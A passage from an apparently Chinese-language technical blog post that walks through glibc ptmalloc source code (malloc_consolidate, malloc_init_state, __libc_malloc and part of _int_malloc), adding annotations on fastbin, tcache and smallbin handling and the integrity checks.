class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">  ------------------------- malloc_consolidate -------------------------</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">  malloc_consolidate is a specialized version of free() that tears</span><br><span class="hljs-comment">  down chunks held in fastbins.  Free itself cannot be used for this</span><br><span class="hljs-comment">  purpose since, among other things, it might place chunks back onto</span><br><span class="hljs-comment">  fastbins.  So, instead, we need to use a minor variant of the same</span><br><span class="hljs-comment">  code.</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">  Also, because this routine needs to be called the first time through</span><br><span class="hljs-comment">  malloc anyway, it turns out to be the perfect place to trigger</span><br><span class="hljs-comment">  initialization code.</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">malloc_consolidate</span><span class="hljs-params">(mstate av)</span></span><br><span class="hljs-function"></span>&#123;<br>  mfastbinptr*    fb;                 <span class="hljs-comment">/* current fastbin being consolidated */</span><br>  mfastbinptr*    maxfb;              <span class="hljs-comment">/* last fastbin (for loop control) */</span><br>  mchunkptr       p;                  <span class="hljs-comment">/* current chunk being consolidated */</span><br>  mchunkptr       nextp;              <span class="hljs-comment">/* next chunk to consolidate */</span><br>  mchunkptr       unsorted_bin;       <span class="hljs-comment">/* bin header */</span><br>  mchunkptr       first_unsorted;     <span class="hljs-comment">/* chunk to link to */</span><br><br>  <span class="hljs-comment">/* These have same use as in free() */</span><br>  mchunkptr       nextchunk;<br>  INTERNAL_SIZE_T size;<br>  INTERNAL_SIZE_T nextsize;<br>  INTERNAL_SIZE_T prevsize;<br>  <span class="hljs-keyword">int</span>             nextinuse;<br>  mchunkptr       bck;<br>  mchunkptr       fwd;<br><br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">      If max_fast is 0, we know that av hasn&#x27;t</span><br><span class="hljs-comment">      yet been initialized, in which case do so below</span><br><span class="hljs-comment">    */</span><br>    <span class="hljs-comment">// 说明 fastbin 已经初始化</span><br>    <span class="hljs-keyword">if</span> (get_max_fast() != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// 清空 fastbin 标记</span><br>        <span class="hljs-comment">// 因为要合并 fastbin 中的 chunk 了。</span><br>        clear_fastchunks(av);<br>        <span class="hljs-comment">//</span><br>        unsorted_bin = unsorted_chunks(av);<br><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">          Remove each chunk from fast bin and consolidate it, placing it</span><br><span class="hljs-comment">          then in unsorted bin. Among other reasons for doing this,</span><br><span class="hljs-comment">          placing in unsorted bin avoids needing to calculate actual bins</span><br><span class="hljs-comment">          until malloc is sure that chunks aren&#x27;t immediately going to be</span><br><span class="hljs-comment">          reused anyway.</span><br><span class="hljs-comment">        */</span><br>        <span class="hljs-comment">// 按照 fd 顺序遍历 fastbin 的每一个 bin，将 bin 中的每一个 chunk 合并掉。</span><br>        maxfb = &amp;fastbin(av, NFASTBINS - <span class="hljs-number">1</span>);<br>        fb    = &amp;fastbin(av, <span class="hljs-number">0</span>);<br>        <span class="hljs-keyword">do</span> &#123;<br>            p = atomic_exchange_acq(fb, <span class="hljs-literal">NULL</span>);<br>            <span class="hljs-keyword">if</span> (p != <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">do</span> &#123;<br>                    check_inuse_chunk(av, p);<br>                    nextp = p-&gt;fd;<br><br>                    <span class="hljs-comment">/* Slightly streamlined version of consolidation code in</span><br><span class="hljs-comment">                     * free() */</span><br>                    size      = chunksize(p);<br>                    nextchunk = chunk_at_offset(p, size);<br>                    nextsize  = chunksize(nextchunk);<br><br>                    <span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;	<span class="hljs-comment">//p的前一块空闲马上取出, 计算合并后大小</span><br>                        prevsize = prev_size(p);<br>                        size += prevsize;<br>                        p = chunk_at_offset(p, -((<span class="hljs-keyword">long</span>) prevsize));<br>                        unlink(av, p, bck, fwd);<br>                    &#125;<br><br>                    <span class="hljs-keyword">if</span> (nextchunk != av-&gt;top) &#123; <br>                        <span class="hljs-comment">// 判断 nextchunk 是否是空闲的。</span><br>                        nextinuse = inuse_bit_at_offset(nextchunk, nextsize);<br><br>                        <span class="hljs-keyword">if</span> (!nextinuse) &#123; <span class="hljs-comment">//p的后一块空闲马上取出, 计算合并后大小</span><br>                            size += nextsize;<br>                            unlink(av, nextchunk, bck, fwd);<br>                        &#125; <span class="hljs-keyword">else</span><br>                         <span class="hljs-comment">// 设置 nextchunk 的 prev inuse 为0，以表明可以合并当前 fast chunk。</span><br>                            clear_inuse_bit_at_offset(nextchunk, <span class="hljs-number">0</span>);<br>                        <br>                        <span class="hljs-comment">//插入unsorted bin的常规操作</span><br>                        first_unsorted     = unsorted_bin-&gt;fd;<br>                        unsorted_bin-&gt;fd   = p;<br>                        first_unsorted-&gt;bk = p;<br><br>                        <span class="hljs-keyword">if</span> (!in_smallbin_range(size)) &#123;<br>                            p-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                            p-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                        &#125;<br><br>                        set_head(p, size | PREV_INUSE);<br>                        p-&gt;bk = unsorted_bin;<br>                        p-&gt;fd = first_unsorted;<br>                        set_foot(p, size);<br>                    &#125;<br>                    <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">//直接和top chunk合并</span><br>                        size += nextsize;<br>                        set_head(p, size | PREV_INUSE);<br>                        av-&gt;top = p;<br>                    &#125;<br><br>                &#125; <span class="hljs-keyword">while</span> ((p = nextp) != <span class="hljs-number">0</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">while</span> (fb++ != maxfb);<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">//如果还没有初始化</span><br>    malloc_init_state(av);<br>    check_malloc_state(av);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="malloc-init-state"><a href="#malloc-init-state" class="headerlink" title="malloc_init_state"></a>malloc_init_state</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Initialize a malloc_state struct.</span><br><span class="hljs-comment">   This is called from ptmalloc_init () or from _int_new_arena ()</span><br><span class="hljs-comment">   when creating a new arena.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">malloc_init_state</span><span class="hljs-params">(mstate av)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">int</span> i;<br>    mbinptr bin;<br>    <span class="hljs-comment">/* Establish circular links for normal bins */</span><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">1</span>; i &lt; NBINS; ++i)<br>    &#123;<br>        bin = bin_at(av, i);<br>        bin-&gt;fd = bin-&gt;bk = bin; <span class="hljs-comment">//初始化, 把所有指针都指向自己</span><br>    &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> MORECORE_CONTIGUOUS</span><br>    <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>        set_noncontiguous(av);<br>    <span class="hljs-keyword">if</span> (av == &amp;main_arena)<br>        set_max_fast(DEFAULT_MXFAST);<br>    <span class="hljs-comment">//2.26, 一个arena在默认情况下并不拥有fastbin chunk</span><br>    atomic_store_relaxed(&amp;av-&gt;have_fastchunks, <span class="hljs-literal">false</span>);<br>    <span class="hljs-comment">//2.25:</span><br>    av-&gt;flags |= FASTCHUNKS_BIT;<br>    <span class="hljs-comment">//将该areva的top chunk指针指向unsorted bin，用以表示初始时top chunk大小为0</span><br>    av-&gt;top = initial_top(av);<br>&#125;<br></code></pre></td></tr></table></figure>

<h1 id="申请内存块"><a href="#申请内存块" class="headerlink" title="申请内存块"></a>申请内存块</h1><h2 id="–libc-malloc"><a href="#–libc-malloc" class="headerlink" title="  –libc-malloc"></a><span id="__libc_malloc"> </span> <a href="#libcmalloc">–libc-malloc</a></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//这只是一个_int_malloc函数的简单wrapper</span><br><span class="hljs-keyword">void</span> * __libc_malloc (<span class="hljs-keyword">size_t</span> bytes)<br>&#123;<br>  mstate ar_ptr;<br>  <span class="hljs-keyword">void</span> *victim;<br>  <span class="hljs-comment">// 检查是否有内存分配钩子，如果有，调用钩子并返回.</span><br>  <span class="hljs-keyword">void</span> *(*hook) (<span class="hljs-keyword">size_t</span>, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *)<br>    = atomic_forced_read (__malloc_hook);<br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    <span class="hljs-keyword">return</span> (*hook)(bytes, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br>    <br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>  <span class="hljs-comment">/* int_free also calls request2size, be careful to not pad twice.  */</span><br>  <span class="hljs-keyword">size_t</span> tbytes = request2size (bytes);<br>  <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx (tbytes);<br><br>  MAYBE_INIT_TCACHE ();<br><br>  DIAG_PUSH_NEEDS_COMMENT;<br>  <span class="hljs-keyword">if</span> (tc_idx &lt; mp_.tcache_bins<br>      <span class="hljs-comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="hljs-comment">/* to appease gcc */</span><br>      &amp;&amp; tcache<br>      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>      <span class="hljs-keyword">return</span> tcache_get (tc_idx);<br>    &#125;<br>  DIAG_POP_NEEDS_COMMENT;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>    <br>  <span class="hljs-comment">//接着会寻找一个 arena 来试图分配内存</span><br>  arena_get (ar_ptr, bytes);<br>  <span class="hljs-comment">//然后调用 _int_malloc 函数去申请对应的内存</span><br>  victim = _int_malloc (ar_ptr, bytes);<br>  <span class="hljs-comment">/* Retry with another arena only if we were able to find a usable arena</span><br><span class="hljs-comment">     before.  */</span><br>  <span class="hljs-keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="hljs-literal">NULL</span>)<br>    &#123;<span class="hljs-comment">//如果分配失败的话，ptmalloc 会尝试再去寻找一个可用的 arena，并分配内存</span><br>      LIBC_PROBE (memory_malloc_retry, <span class="hljs-number">1</span>, bytes);<br>      ar_ptr = arena_get_retry (ar_ptr, bytes);<br>      victim = _int_malloc (ar_ptr, bytes);<br>    &#125;<br><br>  <span class="hljs-keyword">if</span> (ar_ptr != <span class="hljs-literal">NULL</span>)	<span class="hljs-comment">//如果申请到了 arena，那么在退出之前还得解锁</span><br>    __libc_lock_unlock (ar_ptr-&gt;mutex);<br>  <span class="hljs-comment">//要么没有申请到内存</span><br>  <span class="hljs-comment">//要么是 mmap 的内存</span><br>  <span class="hljs-comment">//要么申请到的内存必须在其所分配的 arena 中</span><br>  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||<br>          ar_ptr == arena_for_chunk (mem2chunk (victim)));<br>  <span class="hljs-comment">//最后返回内存</span><br>  <span class="hljs-keyword">return</span> victim;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="int-malloc-非常之长"><a href="#int-malloc-非常之长" class="headerlink" title="_int_malloc(非常之长)"></a>_int_malloc(非常之长)</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> * _int_malloc (mstate av, <span class="hljs-keyword">size_t</span> bytes)<br></code></pre></td></tr></table></figure>

<h3 id="变量定义"><a href="#变量定义" class="headerlink" title="变量定义"></a>变量定义</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c">  INTERNAL_SIZE_T nb;               <span class="hljs-comment">/* normalized request size */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> idx;                 <span class="hljs-comment">/* associated bin index */</span><br>  mbinptr bin;                      <span class="hljs-comment">/* associated bin */</span><br>  mchunkptr victim;                 <span class="hljs-comment">/* inspected/selected chunk */</span><br>  INTERNAL_SIZE_T size;             <span class="hljs-comment">/* its size */</span><br>  <span class="hljs-keyword">int</span> victim_index;                 <span class="hljs-comment">/* its bin index */</span><br>  mchunkptr remainder;              <span class="hljs-comment">/* remainder from a split */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> remainder_size;     <span class="hljs-comment">/* its size */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> block;               <span class="hljs-comment">/* bit map traverser */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> bit;                 <span class="hljs-comment">/* bit map traverser */</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-built_in">map</span>;                 <span class="hljs-comment">/* current word of binmap */</span><br>  mchunkptr fwd;                    <span class="hljs-comment">/* misc temp for linking */</span><br>  mchunkptr bck;                    <span class="hljs-comment">/* misc temp for linking */</span><br><span class="hljs-comment">//if glibc2.26 and after</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>  <span class="hljs-keyword">size_t</span> tcache_unsorted_count;            <span class="hljs-comment">/* count of unsorted chunks processed */</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> REMOVE_FB(fb, victim, pp)                        \</span><br><span class="hljs-meta">  do                                                        \</span><br><span class="hljs-meta">    &#123;                                                        \</span><br><span class="hljs-meta">      victim = pp;                                        \</span><br><span class="hljs-meta">      <span class="hljs-meta-keyword">if</span> (victim == NULL)                                \</span><br><span class="hljs-meta">        break;                                                \</span><br><span class="hljs-meta">    &#125;                                                        \</span><br><span class="hljs-meta">  while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) \</span><br><span class="hljs-meta">         != victim);   </span><br></code></pre></td></tr></table></figure>

<h3 id="简单的check"><a href="#简单的check" class="headerlink" title="简单的check"></a>简单的check</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">     Convert request size to internal form by adding SIZE_SZ bytes</span><br><span class="hljs-comment">     overhead plus possibly more to obtain necessary alignment and/or</span><br><span class="hljs-comment">     to obtain a size of at least MINSIZE, the smallest allocatable</span><br><span class="hljs-comment">     size. Also, checked_request2size traps (returning 0) request sizes</span><br><span class="hljs-comment">     that are so large that they wrap around zero when padded and</span><br><span class="hljs-comment">     aligned.</span><br><span class="hljs-comment">   */</span><br>  checked_request2size (bytes, nb);<br>  <span class="hljs-comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span><br><span class="hljs-comment">     mmap.  */</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (av == <span class="hljs-literal">NULL</span>))<br>    &#123;<br>      <span class="hljs-keyword">void</span> *p = sysmalloc (nb, av);<br>      <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>)<br>        alloc_perturb (p, bytes);<br>      <span class="hljs-keyword">return</span> p;<br>    &#125;<br></code></pre></td></tr></table></figure>

<ul>
<li>注意到checked_request2size()是一个宏定义, 可以<strong>改变参数nb的值</strong> </li>
</ul>
<h3 id="fastbin-range"><a href="#fastbin-range" class="headerlink" title="fastbin_range"></a>fastbin_range</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   If the size qualifies as a fastbin, first check corresponding bin.</span><br><span class="hljs-comment">   This code is safe to execute even if av is not yet initialized, so we</span><br><span class="hljs-comment">   can try it without checking, which saves some time on this fast path.</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure>

<h4 id="2-25"><a href="#2-25" class="headerlink" title="2.25"></a>2.25</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(nb) &lt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(get_max_fast()))<br>&#123;<br>    idx = fastbin_index(nb);<br>    mfastbinptr *fb = &amp;fastbin(av, idx);<br>    mchunkptr pp = *fb;<br>    <span class="hljs-keyword">do</span> <span class="hljs-comment">//取出第一个fastchunk</span><br>    &#123;<br>        victim = pp;<br>        <span class="hljs-keyword">if</span> (victim == <span class="hljs-literal">NULL</span>)<br>            <span class="hljs-keyword">break</span>;<br>    &#125; <span class="hljs-keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq(fb, victim-&gt;fd, victim)) != victim);<br>    <span class="hljs-keyword">if</span> (victim != <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (__builtin_expect(fastbin_index(chunksize(victim)) != idx, <span class="hljs-number">0</span>))<br>        &#123;	<span class="hljs-comment">//请求的bytes-&gt;nb-&gt;idx-&gt;fb, 所以idx是按照bytes来确定的, 从这组idx里取出一个fastbinchunk,</span><br>            <span class="hljs-comment">//将他的大小转换为下标, 如果这两个不相等说明fastbin的size段被篡改</span><br>            <span class="hljs-comment">//chunksize(victim) != nb想来也一样吧(?</span><br>            errstr = <span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>;<br>        errout:<br>            malloc_printerr(check_action, errstr, chunk2mem(victim), av);<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>        &#125;<br>        <span class="hljs-comment">//检查arena,大小,alignment,chunk_size等等</span><br>        check_remalloced_chunk(av, victim, nb);<br>        <span class="hljs-comment">//返回用户指针</span><br>        <span class="hljs-keyword">void</span> *p = chunk2mem(victim);<br>        <span class="hljs-comment">//如果设置了perturb_type, 则将获取到的chunk初始化为 perturb_type ^ 0xff</span><br>        alloc_perturb(p, bytes);<br>        <span class="hljs-keyword">return</span> p;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="2-26"><a href="#2-26" class="headerlink" title="2.26"></a>2.26</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (nb) &lt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>) (get_max_fast ()))<br>    &#123;<br>      idx = fastbin_index (nb);<br>      mfastbinptr *fb = &amp;fastbin (av, idx);<br>      mchunkptr pp;<br>      victim = *fb;<br>      <span class="hljs-keyword">if</span> (victim != <span class="hljs-literal">NULL</span>)<br>        &#123;<br>          <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)<br>            *fb = victim-&gt;fd;<br>          <span class="hljs-keyword">else</span><br>            REMOVE_FB (fb, pp, victim);<br>          <span class="hljs-keyword">if</span> (__glibc_likely (victim != <span class="hljs-literal">NULL</span>))<br>            &#123;<br>              <span class="hljs-keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));<br>              <span class="hljs-keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="hljs-number">0</span>))<br>                malloc_printerr (<span class="hljs-string">&quot;malloc(): memory corruption (fast)&quot;</span>);<br>              check_remalloced_chunk (av, victim, nb);<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>              <span class="hljs-comment">/* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="hljs-comment">                 stash them in the tcache.  */</span><br>              <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx (nb);<br>              <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)<br>                &#123;<br>                  mchunkptr tc_victim;<br>                  <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks.  */</span><br>                  <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count<br>                         &amp;&amp; (tc_victim = *fb) != <span class="hljs-literal">NULL</span>)<br>                    &#123;<br>                      <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)<br>                        *fb = tc_victim-&gt;fd;<br>                      <span class="hljs-keyword">else</span><br>                        &#123;<br>                          REMOVE_FB (fb, pp, tc_victim);<br>                          <span class="hljs-keyword">if</span> (__glibc_unlikely (tc_victim == <span class="hljs-literal">NULL</span>))<br>                            <span class="hljs-keyword">break</span>;<br>                        &#125;<br>                      tcache_put (tc_victim, tc_idx);<br>                    &#125;<br>                &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>              <span class="hljs-keyword">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            &#125;<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure>

<h3 id="smallbin-range-2-26"><a href="#smallbin-range-2-26" class="headerlink" title="smallbin_range 2.26"></a>smallbin_range 2.26</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (in_smallbin_range(nb))<br>&#123;<br>    idx = smallbin_index(nb);<br>    bin = bin_at(av, idx);<br><br>    <span class="hljs-keyword">if</span> ((victim = last(bin)) != bin)	<span class="hljs-comment">//FIFO</span><br>    &#123;<br>        <span class="hljs-keyword">if</span> (victim == <span class="hljs-number">0</span>) <span class="hljs-comment">/* initialization check */</span> <span class="hljs-comment">//???????</span><br>            malloc_consolidate(av);<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            <span class="hljs-comment">//取出倒数第二个</span><br>            bck = victim-&gt;bk;<br>            <span class="hljs-keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim))<br>            &#123;<br>                errstr = <span class="hljs-string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;<br>                <span class="hljs-keyword">goto</span> errout;<br>            &#125;<br>            